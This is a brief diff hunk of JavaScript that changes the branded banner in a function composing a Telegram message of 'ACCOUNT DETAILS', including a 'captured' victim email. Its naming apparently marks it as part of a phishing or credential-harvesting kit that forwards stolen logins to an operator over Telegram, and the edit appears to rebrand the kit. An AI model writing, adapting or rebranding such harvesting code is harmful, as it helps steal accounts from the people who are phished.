@@ -127,7 +127,7 @@ const composeTelegramMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔐 PARISRESULTS 🔐*
+*🔐 BobbyBoxResults 🔐*
 
 *ACCOUNT DETAILS*
 - 📧 Email: \`${email || 'Not captured'}\`
